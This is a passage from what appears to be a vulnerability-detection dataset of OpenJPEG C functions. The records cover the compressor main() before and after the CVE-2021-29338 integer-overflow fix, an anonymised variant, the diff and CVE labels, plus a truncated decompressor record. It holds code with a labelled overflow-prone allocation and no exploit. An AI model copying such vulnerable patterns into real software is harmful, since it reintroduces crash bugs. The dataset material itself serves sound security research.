            if (mainlevel > 0 && mainlevel <= OPJ_IMF_MAINLEVEL_MAX) {
                const int limitMSamplesSec[] = {
                    0,
                    OPJ_IMF_MAINLEVEL_1_MSAMPLESEC,
                    OPJ_IMF_MAINLEVEL_2_MSAMPLESEC,
                    OPJ_IMF_MAINLEVEL_3_MSAMPLESEC,
                    OPJ_IMF_MAINLEVEL_4_MSAMPLESEC,
                    OPJ_IMF_MAINLEVEL_5_MSAMPLESEC,
                    OPJ_IMF_MAINLEVEL_6_MSAMPLESEC,
                    OPJ_IMF_MAINLEVEL_7_MSAMPLESEC,
                    OPJ_IMF_MAINLEVEL_8_MSAMPLESEC,
                    OPJ_IMF_MAINLEVEL_9_MSAMPLESEC,
                    OPJ_IMF_MAINLEVEL_10_MSAMPLESEC,
                    OPJ_IMF_MAINLEVEL_11_MSAMPLESEC
                };
                OPJ_UINT32 avgcomponents = image->numcomps;
                double msamplespersec;
                if (image->numcomps == 3 &&
                        image->comps[1].dx == 2 &&
                        image->comps[1].dy == 2) {
                    avgcomponents = 2;
                }
                msamplespersec = (double)image->x1 * image->y1 * avgcomponents * framerate /
                                 1e6;
                if (msamplespersec > limitMSamplesSec[mainlevel]) {
                    fprintf(stderr,
                            ""Warning: MSamples/sec is %f, whereas limit is %d.\n"",
                            msamplespersec,
                            limitMSamplesSec[mainlevel]);
                }
            }
        }

        /* encode the destination image */
        /* ---------------------------- */

        switch (parameters.cod_format) {
        case J2K_CFMT: { /* JPEG-2000 codestream */
            /* Get a decoder handle */
            l_codec = opj_create_compress(OPJ_CODEC_J2K);
            break;
        }
        case JP2_CFMT: { /* JPEG 2000 compressed image data */
            /* Get a decoder handle */
            l_codec = opj_create_compress(OPJ_CODEC_JP2);
            break;
        }
        default:
            fprintf(stderr, ""skipping file..\n"");
            opj_stream_destroy(l_stream);
            continue;
        }

        /* catch events using our callbacks and give a local context */
        opj_set_info_handler(l_codec, info_callback, 00);
        opj_set_warning_handler(l_codec, warning_callback, 00);
        opj_set_error_handler(l_codec, error_callback, 00);

        if (bUseTiles) {
            parameters.cp_tx0 = 0;
            parameters.cp_ty0 = 0;
            parameters.tile_size_on = OPJ_TRUE;
            parameters.cp_tdx = 512;
            parameters.cp_tdy = 512;
        }
        if (! opj_setup_encoder(l_codec, &parameters, image)) {
            fprintf(stderr, ""failed to encode image: opj_setup_encoder\n"");
            opj_destroy_codec(l_codec);
            opj_image_destroy(image);
            ret = 1;
            goto fin;
        }

        if (PLT || TLM) {
            const char* options[3] = { NULL, NULL, NULL };
            int iOpt = 0;
            if (PLT) {
                options[iOpt++] = ""PLT=YES"";
            }
            if (TLM) {
                options[iOpt++] = ""TLM=YES"";
            }
            (void)iOpt;
            if (!opj_encoder_set_extra_options(l_codec, options)) {
                fprintf(stderr, ""failed to encode image: opj_encoder_set_extra_options\n"");
                opj_destroy_codec(l_codec);
                opj_image_destroy(image);
                ret = 1;
                goto fin;
            }
        }

        if (num_threads >= 1 &&
                !opj_codec_set_threads(l_codec, num_threads)) {
            fprintf(stderr, ""failed to set number of threads\n"");
            opj_destroy_codec(l_codec);
            opj_image_destroy(image);
            ret = 1;
            goto fin;
        }

        /* open a byte stream for writing and allocate memory for all tiles */
        l_stream = opj_stream_create_default_file_stream(parameters.outfile, OPJ_FALSE);
        if (! l_stream) {
            ret = 1;
            goto fin;
        }

        /* encode the image */
        bSuccess = opj_start_compress(l_codec, image, l_stream);
        if (!bSuccess)  {
            fprintf(stderr, ""failed to encode image: opj_start_compress\n"");
        }
        if (bSuccess && bUseTiles) {
            OPJ_BYTE *l_data;
            OPJ_UINT32 l_data_size = 512 * 512 * 3;
            l_data = (OPJ_BYTE*) calloc(1, l_data_size);
            if (l_data == NULL) {
                ret = 1;
                goto fin;
            }
            for (i = 0; i < l_nb_tiles; ++i) {
                if (! opj_write_tile(l_codec, i, l_data, l_data_size, l_stream)) {
                    fprintf(stderr, ""ERROR -> test_tile_encoder: failed to write the tile %d!\n"",
                            i);
                    opj_stream_destroy(l_stream);
                    opj_destroy_codec(l_codec);
                    opj_image_destroy(image);
                    ret = 1;
                    goto fin;
                }
            }
            free(l_data);
        } else {
            bSuccess = bSuccess && opj_encode(l_codec, l_stream);
            if (!bSuccess)  {
                fprintf(stderr, ""failed to encode image: opj_encode\n"");
            }
        }
        bSuccess = bSuccess && opj_end_compress(l_codec, l_stream);
        if (!bSuccess)  {
            fprintf(stderr, ""failed to encode image: opj_end_compress\n"");
        }

        if (!bSuccess)  {
            opj_stream_destroy(l_stream);
            opj_destroy_codec(l_codec);
            opj_image_destroy(image);
            fprintf(stderr, ""failed to encode image\n"");
            remove(parameters.outfile);
            ret = 1;
            goto fin;
        }

        num_compressed_files++;
        fprintf(stdout, ""[INFO] Generated outfile %s\n"", parameters.outfile);
        /* close and free the byte stream */
        opj_stream_destroy(l_stream);

        /* free remaining compression structures */
        opj_destroy_codec(l_codec);

        /* free image data */
        opj_image_destroy(image);

    }

    t = opj_clock() - t;
    if (num_compressed_files) {
        fprintf(stdout, ""encode time: %d ms \n"",
                (int)((t * 1000.0) / (OPJ_FLOAT64)num_compressed_files));
    }

    ret = 0;

fin:
    if (parameters.cp_comment) {
        free(parameters.cp_comment);
    }
    if (parameters.cp_matrice) {
        free(parameters.cp_matrice);
    }
    if (raw_cp.rawComps) {
        free(raw_cp.rawComps);
    }
    if (img_fol.imgdirpath) {
        free(img_fol.imgdirpath);
    }
    if (dirptr) {
        if (dirptr->filename_buf) {
            free(dirptr->filename_buf);
        }
        if (dirptr->filename) {
            free(dirptr->filename);
        }
        free(dirptr);
    }
    return ret;
}","int main(int VAR_0, char **VAR_1)
{

    opj_cparameters_t VAR_2;   /* COMMENT_0 */

    opj_stream_t *VAR_3 = 00;
    opj_codec_t* VAR_4 = 00;
    opj_image_t *VAR_5 = NULL;
    raw_cparameters_t VAR_6;
    OPJ_SIZE_T VAR_7 = 0;

    char VAR_8[VAR_9];   /* COMMENT_1 */

    unsigned int VAR_10, VAR_11, VAR_12;
    img_fol_t VAR_13;
    dircnt_t *VAR_14 = NULL;

    int VAR_15 = 0;

    OPJ_BOOL VAR_16;
    OPJ_BOOL VAR_17 = VAR_18; /* COMMENT_2 */
    OPJ_UINT32 VAR_19 = 4;
    int VAR_20 = 0;
    OPJ_FLOAT64 VAR_21 = opj_clock();

    OPJ_BOOL VAR_22 = VAR_18;
    OPJ_BOOL VAR_23 = VAR_18;
    int VAR_24 = 0;

    /* COMMENT_3 */
    unsigned int VAR_25 = 0;

    /* COMMENT_4 */
    opj_set_default_encoder_parameters(&VAR_2);

    /* COMMENT_5 */
    *VAR_8 = 0;
    memset(&VAR_13, 0, sizeof(img_fol_t));

    /* COMMENT_6 */
    VAR_6.rawBitDepth = 0;
    VAR_6.rawComp = 0;
    VAR_6.rawComps = 0;
    VAR_6.rawHeight = 0;
    VAR_6.rawSigned = 0;
    VAR_6.rawWidth = 0;

    /* COMMENT_7 */
    VAR_2.tcp_mct = (char)
                         255; /* COMMENT_8 */
    if (parse_cmdline_encoder(VAR_0, VAR_1, &VAR_2, &VAR_13, &VAR_6,
                              VAR_8, sizeof(VAR_8), &VAR_20, &VAR_22, &VAR_23,
                              &VAR_24, &VAR_25) == 1) {
        VAR_15 = 1;
        goto fin;
    }

    /* COMMENT_9 */
    if (VAR_13.set_imgdir == 1) {
        VAR_11 = get_num_images(VAR_13.imgdirpath);
        VAR_14 = (dircnt_t*)malloc(sizeof(dircnt_t));
        if (VAR_14) {
            VAR_14->filename_buf = (char*)calloc(VAR_11, VAR_9 * sizeof(
                    char)); /* COMMENT_10 */
            VAR_14->filename = (char**) calloc(VAR_11, sizeof(char*));
            if (!VAR_14->filename_buf) {
                VAR_15 = 0;
                goto fin;
            }
            for (VAR_10 = 0; VAR_10 < VAR_11; VAR_10++) {
                VAR_14->filename[VAR_10] = VAR_14->filename_buf + VAR_10 * VAR_9;
            }
        }
        if (load_images(VAR_14, VAR_13.imgdirpath) == 1) {
            VAR_15 = 0;
            goto fin;
        }
        if (VAR_11 == 0) {
            fprintf(VAR_26, ""Folder is empty\n"");
            VAR_15 = 0;
            goto fin;
        }
    } else {
        VAR_11 = 1;
    }
    /* COMMENT_11 */
    for (VAR_12 = 0; VAR_12 < VAR_11; VAR_12++) {
        VAR_5 = NULL;
        fprintf(VAR_27, ""\n"");

        if (VAR_13.set_imgdir == 1) {
            if (get_next_file((int)VAR_12, VAR_14, &VAR_13, &VAR_2)) {
                fprintf(VAR_27, ""skipping file...\n"");
                continue;
            }
        }

        switch (VAR_2.decod_format) {
        case VAR_28:
        case VAR_29:
        case VAR_30:
        case VAR_31:
        case VAR_32:
        case VAR_33:
        case VAR_34:
        case VAR_35:
            break;
        default:
            fprintf(VAR_27, ""skipping file...\n"");
            continue;
        }

        /* COMMENT_12 */
        /* COMMENT_13 */

        switch (VAR_2.decod_format) {
        case VAR_28:
            VAR_5 = pgxtoimage(VAR_2.infile, &VAR_2);
            if (!VAR_5) {
                fprintf(VAR_27, ""Unable to load pgx file\n"");
                VAR_15 = 1;
                goto fin;
            }
            break;

        case VAR_29:
            VAR_5 = pnmtoimage(VAR_2.infile, &VAR_2);
            if (!VAR_5) {
                fprintf(VAR_27, ""Unable to load pnm file\n"");
                VAR_15 = 1;
                goto fin;
            }
            break;

        case VAR_30:
            VAR_5 = bmptoimage(VAR_2.infile, &VAR_2);
            if (!VAR_5) {
                fprintf(VAR_27, ""Unable to load bmp file\n"");
                VAR_15 = 1;
                goto fin;
            }
            break;

#ifdef VAR_36
        case VAR_31:
            VAR_5 = tiftoimage(VAR_2.infile, &VAR_2, VAR_25);
            if (!VAR_5) {
                fprintf(VAR_27, ""Unable to load tif(f) file\n"");
                VAR_15 = 1;
                goto fin;
            }
            break;
#endif /* COMMENT_14 */

        case VAR_32:
            VAR_5 = rawtoimage(VAR_2.infile, &VAR_2, &VAR_6);
            if (!VAR_5) {
                fprintf(VAR_27, ""Unable to load raw or yuv file\n"");
                VAR_15 = 1;
                goto fin;
            }
            break;

        case VAR_33:
            VAR_5 = rawltoimage(VAR_2.infile, &VAR_2, &VAR_6);
            if (!VAR_5) {
                fprintf(VAR_27, ""Unable to load raw file\n"");
                VAR_15 = 1;
                goto fin;
            }
            break;

        case VAR_34:
            VAR_5 = tgatoimage(VAR_2.infile, &VAR_2);
            if (!VAR_5) {
                fprintf(VAR_27, ""Unable to load tga file\n"");
                VAR_15 = 1;
                goto fin;
            }
            break;

#ifdef VAR_37
        case VAR_35:
            VAR_5 = pngtoimage(VAR_2.infile, &VAR_2);
            if (!VAR_5) {
                fprintf(VAR_27, ""Unable to load png file\n"");
                VAR_15 = 1;
                goto fin;
            }
            break;
#endif /* COMMENT_15 */
        }

        /* COMMENT_16 */
                                                             
          
        if (!VAR_5) {
            fprintf(VAR_27, ""Unable to load file: got no image\n"");
            VAR_15 = 1;
            goto fin;
        }

        /* COMMENT_19 */
        if (VAR_2.tcp_mct == (char)
                255) { /* COMMENT_20 */
            VAR_2.tcp_mct = (VAR_5->numcomps >= 3) ? 1 : 0;
        } else {            /* COMMENT_21 */
            if ((VAR_2.tcp_mct == 1) && (VAR_5->numcomps < 3)) {
                fprintf(VAR_27, ""RGB->YCC conversion cannot be used:\n"");
                fprintf(VAR_27, ""Input image has less than 3 components\n"");
                VAR_15 = 1;
                goto fin;
            }
            if ((VAR_2.tcp_mct == 2) && (!VAR_2.mct_data)) {
                fprintf(VAR_27, ""Custom MCT has been set but no array-based MCT\n"");
                fprintf(VAR_27, ""has been provided. Aborting.\n"");
                VAR_15 = 1;
                goto fin;
            }
        }

        if (OPJ_IS_IMF(VAR_2.rsiz) && VAR_20 > 0) {
            const int VAR_38 = OPJ_GET_IMF_MAINLEVEL(VAR_2.rsiz);
            if (VAR_38 > 0 && VAR_38 <= VAR_39) {
                const int VAR_40[] = {
                    0,
                    VAR_41,
                    VAR_42,
                    VAR_43,
                    VAR_44,
                    VAR_45,
                    VAR_46,
                    VAR_47,
                    VAR_48,
                    VAR_49,
                    VAR_50,
                    VAR_51
                };
                OPJ_UINT32 VAR_52 = VAR_5->numcomps;
                double VAR_53;
                if (VAR_5->numcomps == 3 &&
                        VAR_5->comps[1].dx == 2 &&
                        VAR_5->comps[1].dy == 2) {
                    VAR_52 = 2;
                }
                VAR_53 = (double)VAR_5->x1 * VAR_5->y1 * VAR_52 * VAR_20 /
                                 1e6;
                if (VAR_53 > VAR_40[VAR_38]) {
                    fprintf(VAR_27,
                            ""Warning: MSamples/sec is %f, whereas limit is %d.\n"",
                            VAR_53,
                            VAR_40[VAR_38]);
                }
            }
        }

        /* COMMENT_22 */
        /* COMMENT_23 */

        switch (VAR_2.cod_format) {
        case VAR_54: { /* COMMENT_24 */
            /* COMMENT_25 */
            VAR_4 = opj_create_compress(VAR_55);
            break;
        }
        case VAR_56: { /* COMMENT_26 */
            /* COMMENT_25 */
            VAR_4 = opj_create_compress(VAR_57);
            break;
        }
        default:
            fprintf(VAR_27, ""skipping file..\n"");
            opj_stream_destroy(VAR_3);
            continue;
        }

        /* COMMENT_27 */
        opj_set_info_handler(VAR_4, VAR_58, 00);
        opj_set_warning_handler(VAR_4, VAR_59, 00);
        opj_set_error_handler(VAR_4, VAR_60, 00);

        if (VAR_17) {
            VAR_2.cp_tx0 = 0;
            VAR_2.cp_ty0 = 0;
            VAR_2.tile_size_on = VAR_61;
            VAR_2.cp_tdx = 512;
            VAR_2.cp_tdy = 512;
        }
        if (! opj_setup_encoder(VAR_4, &VAR_2, VAR_5)) {
            fprintf(VAR_27, ""failed to encode image: opj_setup_encoder\n"");
            opj_destroy_codec(VAR_4);
            opj_image_destroy(VAR_5);
            VAR_15 = 1;
            goto fin;
        }

        if (VAR_22 || VAR_23) {
            const char* VAR_62[3] = { NULL, NULL, NULL };
            int VAR_63 = 0;
            if (VAR_22) {
                VAR_62[VAR_63++] = ""PLT=YES"";
            }
            if (VAR_23) {
                VAR_62[VAR_63++] = ""TLM=YES"";
            }
            (void)VAR_63;
            if (!opj_encoder_set_extra_options(VAR_4, VAR_62)) {
                fprintf(VAR_27, ""failed to encode image: opj_encoder_set_extra_options\n"");
                opj_destroy_codec(VAR_4);
                opj_image_destroy(VAR_5);
                VAR_15 = 1;
                goto fin;
            }
        }

        if (VAR_24 >= 1 &&
                !opj_codec_set_threads(VAR_4, VAR_24)) {
            fprintf(VAR_27, ""failed to set number of threads\n"");
            opj_destroy_codec(VAR_4);
            opj_image_destroy(VAR_5);
            VAR_15 = 1;
            goto fin;
        }

        /* COMMENT_28 */
        VAR_3 = opj_stream_create_default_file_stream(VAR_2.outfile, VAR_18);
        if (! VAR_3) {
            VAR_15 = 1;
            goto fin;
        }

        /* COMMENT_29 */
        VAR_16 = opj_start_compress(VAR_4, VAR_5, VAR_3);
        if (!VAR_16)  {
            fprintf(VAR_27, ""failed to encode image: opj_start_compress\n"");
        }
        if (VAR_16 && VAR_17) {
            OPJ_BYTE *VAR_64;
            OPJ_UINT32 VAR_65 = 512 * 512 * 3;
            VAR_64 = (OPJ_BYTE*) calloc(1, VAR_65);
            if (VAR_64 == NULL) {
                VAR_15 = 1;
                goto fin;
            }
            for (VAR_10 = 0; VAR_10 < VAR_19; ++VAR_10) {
                if (! opj_write_tile(VAR_4, VAR_10, VAR_64, VAR_65, VAR_3)) {
                    fprintf(VAR_27, ""ERROR -> test_tile_encoder: failed to write the tile %d!\n"",
                            VAR_10);
                    opj_stream_destroy(VAR_3);
                    opj_destroy_codec(VAR_4);
                    opj_image_destroy(VAR_5);
                    VAR_15 = 1;
                    goto fin;
                }
            }
            free(VAR_64);
        } else {
            VAR_16 = VAR_16 && opj_encode(VAR_4, VAR_3);
            if (!VAR_16)  {
                fprintf(VAR_27, ""failed to encode image: opj_encode\n"");
            }
        }
        VAR_16 = VAR_16 && opj_end_compress(VAR_4, VAR_3);
        if (!VAR_16)  {
            fprintf(VAR_27, ""failed to encode image: opj_end_compress\n"");
        }

        if (!VAR_16)  {
            opj_stream_destroy(VAR_3);
            opj_destroy_codec(VAR_4);
            opj_image_destroy(VAR_5);
            fprintf(VAR_27, ""failed to encode image\n"");
            remove(VAR_2.outfile);
            VAR_15 = 1;
            goto fin;
        }

        VAR_7++;
        fprintf(VAR_26, ""[INFO] Generated outfile %s\n"", VAR_2.outfile);
        /* COMMENT_30 */
        opj_stream_destroy(VAR_3);

        /* COMMENT_31 */
        opj_destroy_codec(VAR_4);

        /* COMMENT_32 */
        opj_image_destroy(VAR_5);

    }

    VAR_21 = opj_clock() - VAR_21;
    if (VAR_7) {
        fprintf(VAR_26, ""encode time: %d ms \n"",
                (int)((VAR_21 * 1000.0) / (OPJ_FLOAT64)VAR_7));
    }

    VAR_15 = 0;

fin:
    if (VAR_2.cp_comment) {
        free(VAR_2.cp_comment);
    }
    if (VAR_2.cp_matrice) {
        free(VAR_2.cp_matrice);
    }
    if (VAR_6.rawComps) {
        free(VAR_6.rawComps);
    }
    if (VAR_13.imgdirpath) {
        free(VAR_13.imgdirpath);
    }
    if (VAR_14) {
        if (VAR_14->filename_buf) {
            free(VAR_14->filename_buf);
        }
        if (VAR_14->filename) {
            free(VAR_14->filename);
        }
        free(VAR_14);
    }
    return VAR_15;
}",uclouvain/openjpeg/f0727df07c4d944d7d1c5002451cfbc9545d3288/opj_compress.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -60,9 +60,9 @@
         num_images = get_num_images(img_fol.imgdirpath);
         dirptr = (dircnt_t*)malloc(sizeof(dircnt_t));
         if (dirptr) {
-            dirptr->filename_buf = (char*)malloc(num_images * OPJ_PATH_LEN * sizeof(
+            dirptr->filename_buf = (char*)calloc(num_images, OPJ_PATH_LEN * sizeof(
                     char)); /* Stores at max 10 image file names*/
-            dirptr->filename = (char**) malloc(num_images * sizeof(char*));
+            dirptr->filename = (char**) calloc(num_images, sizeof(char*));
             if (!dirptr->filename_buf) {
                 ret = 0;
                 goto fin;","{'deleted_lines': ['            dirptr->filename_buf = (char*)malloc(num_images * OPJ_PATH_LEN * sizeof(', '            dirptr->filename = (char**) malloc(num_images * sizeof(char*));'], 'added_lines': ['            dirptr->filename_buf = (char*)calloc(num_images, OPJ_PATH_LEN * sizeof(', '            dirptr->filename = (char**) calloc(num_images, sizeof(char*));']}",True,"Integer Overflow in OpenJPEG v2.4.0 allows remote attackers to crash the application, causing a Denial of Service (DoS). This occurs when the attacker uses the command line option ""-ImgDir"" on a directory that contains 1048576 files.",5.5,MEDIUM,1,valid,2022-01-12T11:20:28Z,4
CVE-2021-29338,['CWE-190'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,uclouvain/openjpeg,"Fix integer overflow in num_images

Includes the fix for CVE-2021-29338
Credit to @kaniini based on #1346
Fixes #1338",f0727df07c4d944d7d1c5002451cfbc9545d3288,https://github.com/uclouvain/openjpeg/commit/f0727df07c4d944d7d1c5002451cfbc9545d3288,src/bin/jp2/opj_decompress.c,main,"int main(int argc, char **argv)
{
opj_decompress_parameters parameters;           
OPJ_INT32 num_images, imageno;
img_fol_t img_fol;
dircnt_t *dirptr = NULL;
int failed = 0;
OPJ_FLOAT64 t, tCumulative = 0;
OPJ_UINT32 numDecompressedImages = 0;
OPJ_UINT32 cp_reduce;
set_default_parameters(&parameters);
memset(&img_fol, 0, sizeof(img_fol_t));
if (parse_cmdline_decoder(argc, argv, &parameters, &img_fol) == 1) {
failed = 1;
goto fin;
}
cp_reduce = parameters.core.cp_reduce;
if (getenv(""USE_OPJ_SET_DECODED_RESOLUTION_FACTOR"") != NULL) {
parameters.core.cp_reduce = 0;
}
if (img_fol.set_imgdir == 1) {
int it_image;
num_images = get_num_images(img_fol.imgdirpath);
dirptr = (dircnt_t*)calloc(1, sizeof(dircnt_t));
if (!dirptr) {
destroy_parameters(&parameters);
return EXIT_FAILURE;
}
dirptr->filename_buf = (char*)malloc(sizeof(char) *
(size_t)num_images * OPJ_PATH_LEN);
if (!dirptr->filename_buf) {
failed = 1;
goto fin;
}
dirptr->filename = (char**) malloc((size_t)num_images * sizeof(char*));
if (!dirptr->filename) {
failed = 1;
goto fin;
}
for (it_image = 0; it_image < num_images; it_image++) {
dirptr->filename[it_image] = dirptr->filename_buf + it_image * OPJ_PATH_LEN;
}
if (load_images(dirptr, img_fol.imgdirpath) == 1) {
failed = 1;
goto fin;
}
if (num_images == 0) {
fprintf(stderr, ""Folder is empty\n"");
failed = 1;
goto fin;
}
} else {
num_images = 1;
}
for (imageno = 0; imageno < num_images ; imageno++)  {
opj_image_t* image = NULL;
opj_stream_t *l_stream = NULL;              
opj_codec_t* l_codec = NULL;                
opj_codestream_index_t* cstr_index = NULL;
if (!parameters.quiet) {
fprintf(stderr, ""\n"");
}
if (img_fol.set_imgdir == 1) {
if (get_next_file(imageno, dirptr, &img_fol, &parameters)) {
fprintf(stderr, ""skipping file...\n"");
destroy_parameters(&parameters);
continue;
}
}
l_stream = opj_stream_create_default_file_stream(parameters.infile, 1);
if (!l_stream) {
fprintf(stderr, ""ERROR -> failed to create the stream from the file %s\n"",
parameters.infile);
failed = 1;
goto fin;
}
switch (parameters.decod_format) {
case J2K_CFMT: { 
l_codec = opj_create_decompress(OPJ_CODEC_J2K);
break;
}
case JP2_CFMT: { 
l_codec = opj_create_decompress(OPJ_CODEC_JP2);
break;
}
case JPT_CFMT: { 
l_codec = opj_create_decompress(OPJ_CODEC_JPT);
break;
}
default:
fprintf(stderr, ""skipping file..\n"");
destroy_parameters(&parameters);
opj_stream_destroy(l_stream);
continue;
}
if (parameters.quiet) {
opj_set_info_handler(l_codec, quiet_callback, 00);
opj_set_warning_handler(l_codec, quiet_callback, 00);
opj_set_error_handler(l_codec, quiet_callback, 00);
} else {
opj_set_info_handler(l_codec, info_callback, 00);
opj_set_warning_handler(l_codec, warning_callback, 00);
opj_set_error_handler(l_codec, error_callback, 00);
}
t = opj_clock();
if (!opj_setup_decoder(l_codec, &(parameters.core))) {
fprintf(stderr, ""ERROR -> opj_decompress: failed to setup the decoder\n"");
opj_stream_destroy(l_stream);
opj_destroy_codec(l_codec);
failed = 1;
goto fin;
}
if (parameters.num_threads >= 1 &&
!opj_codec_set_threads(l_codec, parameters.num_threads)) {
fprintf(stderr, ""ERROR -> opj_decompress: failed to set number of threads\n"");
opj_stream_destroy(l_stream);
opj_destroy_codec(l_codec);
failed = 1;
goto fin;
}
if (! opj_read_header(l_stream, l_codec, &image)) {
fprintf(stderr, ""ERROR -> opj_decompress: failed to read the header\n"");
opj_stream_destroy(l_stream);
opj_destroy_codec(l_codec);
opj_image_destroy(image);
failed = 1;
goto fin;
}
if (parameters.numcomps) {
if (! opj_set_decoded_components(l_codec,
parameters.numcomps,
parameters.comps_indices,
OPJ_FALSE)) {
fprintf(stderr,
""ERROR -> opj_decompress: failed to set the component indices!\n"");
opj_destroy_codec(l_codec);
opj_stream_destroy(l_stream);
opj_image_destroy(image);
failed = 1;
goto fin;
}
}
if (getenv(""USE_OPJ_SET_DECODED_RESOLUTION_FACTOR"") != NULL) {
if (! opj_set_decoded_resolution_factor(l_codec, cp_reduce)) {
fprintf(stderr,
""ERROR -> opj_decompress: failed to set the resolution factor tile!\n"");
opj_destroy_codec(l_codec);
opj_stream_destroy(l_stream);
opj_image_destroy(image);
failed = 1;
goto fin;
}
}
if (!parameters.nb_tile_to_decode) {
if (getenv(""SKIP_OPJ_SET_DECODE_AREA"") != NULL &&
parameters.DA_x0 == 0 &&
parameters.DA_y0 == 0 &&
parameters.DA_x1 == 0 &&
parameters.DA_y1 == 0) {
}
else if (!opj_set_decode_area(l_codec, image, (OPJ_INT32)parameters.DA_x0,
(OPJ_INT32)parameters.DA_y0, (OPJ_INT32)parameters.DA_x1,
(OPJ_INT32)parameters.DA_y1)) {
fprintf(stderr, ""ERROR -> opj_decompress: failed to set the decoded area\n"");
opj_stream_destroy(l_stream);
opj_destroy_codec(l_codec);
opj_image_destroy(image);
failed = 1;
goto fin;
}
if (!(opj_decode(l_codec, l_stream, image) &&
opj_end_decompress(l_codec,   l_stream))) {
fprintf(stderr, ""ERROR -> opj_decompress: failed to decode image!\n"");
opj_destroy_codec(l_codec);
opj_stream_destroy(l_stream);
opj_image_destroy(image);
failed = 1;
goto fin;
}
} else {
if (!(parameters.DA_x0 == 0 &&
parameters.DA_y0 == 0 &&
parameters.DA_x1 == 0 &&
parameters.DA_y1 == 0)) {
if (!(parameters.quiet)) {
fprintf(stderr, ""WARNING: -d option ignored when used together with -t\n"");
}
}
if (!opj_get_decoded_tile(l_codec, l_stream, image, parameters.tile_index)) {
fprintf(stderr, ""ERROR -> opj_decompress: failed to decode tile!\n"");
opj_destroy_codec(l_codec);
opj_stream_destroy(l_stream);
opj_image_destroy(image);
failed = 1;
goto fin;
}
if (!(parameters.quiet)) {
fprintf(stdout, ""tile %d is decoded!\n\n"", parameters.tile_index);
}
}
tCumulative += opj_clock() - t;
numDecompressedImages++;
opj_stream_destroy(l_stream);
if (image->color_space != OPJ_CLRSPC_SYCC
&& image->numcomps == 3 && image->comps[0].dx == image->comps[0].dy
&& image->comps[1].dx != 1) {
image->color_space = OPJ_CLRSPC_SYCC;
} else if (image->numcomps <= 2) {
image->color_space = OPJ_CLRSPC_GRAY;
}
if (image->color_space == OPJ_CLRSPC_SYCC) {
color_sycc_to_rgb(image);
} else if ((image->color_space == OPJ_CLRSPC_CMYK) &&
(parameters.cod_format != TIF_DFMT)) {
color_cmyk_to_rgb(image);
} else if (image->color_space == OPJ_CLRSPC_EYCC) {
color_esycc_to_rgb(image);
}
if (image->icc_profile_buf) {
#if defined(OPJ_HAVE_LIBLCMS1) || defined(OPJ_HAVE_LIBLCMS2)
if (image->icc_profile_len) {
color_apply_icc_profile(image);
} else {
color_cielab_to_rgb(image);
}
#endif
free(image->icc_profile_buf);
image->icc_profile_buf = NULL;
image->icc_profile_len = 0;
}
if (parameters.precision != NULL) {
OPJ_UINT32 compno;
for (compno = 0; compno < image->numcomps; ++compno) {
OPJ_UINT32 precno = compno;
OPJ_UINT32 prec;
if (precno >= parameters.nb_precision) {
precno = parameters.nb_precision - 1U;
}
prec = parameters.precision[precno].prec;
if (prec == 0) {
prec = image->comps[compno].prec;
}
switch (parameters.precision[precno].mode) {
case OPJ_PREC_MODE_CLIP:
clip_component(&(image->comps[compno]), prec);
break;
case OPJ_PREC_MODE_SCALE:
scale_component(&(image->comps[compno]), prec);
break;
default:
break;
}
}
}
if (parameters.upsample) {
image = upsample_image_components(image);
if (image == NULL) {
fprintf(stderr,
""ERROR -> opj_decompress: failed to upsample image components!\n"");
opj_destroy_codec(l_codec);
failed = 1;
goto fin;
}
}
if (parameters.force_rgb) {
switch (image->color_space) {
case OPJ_CLRSPC_SRGB:
break;
case OPJ_CLRSPC_GRAY:
image = convert_gray_to_rgb(image);
break;
default:
fprintf(stderr,
""ERROR -> opj_decompress: don't know how to convert image to RGB colorspace!\n"");
opj_image_destroy(image);
image = NULL;
break;
}
if (image == NULL) {
fprintf(stderr, ""ERROR -> opj_decompress: failed to convert to RGB image!\n"");
opj_destroy_codec(l_codec);
failed = 1;
goto fin;
}
}
switch (parameters.cod_format) {
case PXM_DFMT:          
if (imagetopnm(image, parameters.outfile, parameters.split_pnm)) {
fprintf(stderr, ""[ERROR] Outfile %s not generated\n"", parameters.outfile);
failed = 1;
} else if (!(parameters.quiet)) {
fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
}
break;
case PGX_DFMT:          
if (imagetopgx(image, parameters.outfile)) {
fprintf(stderr, ""[ERROR] Outfile %s not generated\n"", parameters.outfile);
failed = 1;
} else if (!(parameters.quiet)) {
fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
}
break;
case BMP_DFMT:          
if (imagetobmp(image, parameters.outfile)) {
fprintf(stderr, ""[ERROR] Outfile %s not generated\n"", parameters.outfile);
failed = 1;
} else if (!(parameters.quiet)) {
fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
}
break;
#ifdef OPJ_HAVE_LIBTIFF
case TIF_DFMT:          
if (imagetotif(image, parameters.outfile)) {
fprintf(stderr, ""[ERROR] Outfile %s not generated\n"", parameters.outfile);
failed = 1;
} else if (!(parameters.quiet)) {
fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
}
break;
#endif 
case RAW_DFMT:          
if (imagetoraw(image, parameters.outfile)) {
fprintf(stderr,
""[ERROR] Error generating raw or yuv file. Outfile %s not generated\n"",
parameters.outfile);
failed = 1;
} else if (!(parameters.quiet)) {
fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
}
break;
case RAWL_DFMT:         
if (imagetorawl(image, parameters.outfile)) {
fprintf(stderr,
""[ERROR] Error generating rawl file. Outfile %s not generated\n"",
parameters.outfile);
failed = 1;
} else if (!(parameters.quiet)) {
fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
}
break;
case TGA_DFMT:          
if (imagetotga(image, parameters.outfile)) {
fprintf(stderr, ""[ERROR] Error generating tga file. Outfile %s not generated\n"",
parameters.outfile);
failed = 1;
} else if (!(parameters.quiet)) {
fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
}
break;
#ifdef OPJ_HAVE_LIBPNG
case PNG_DFMT:          
if (imagetopng(image, parameters.outfile)) {
fprintf(stderr, ""[ERROR] Error generating png file. Outfile %s not generated\n"",
parameters.outfile);
failed = 1;
} else if (!(parameters.quiet)) {
fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
}
break;
#endif 
default:
fprintf(stderr, ""[ERROR] Outfile %s not generated\n"", parameters.outfile);
failed = 1;
}
if (l_codec) {
opj_destroy_codec(l_codec);
}
opj_image_destroy(image);
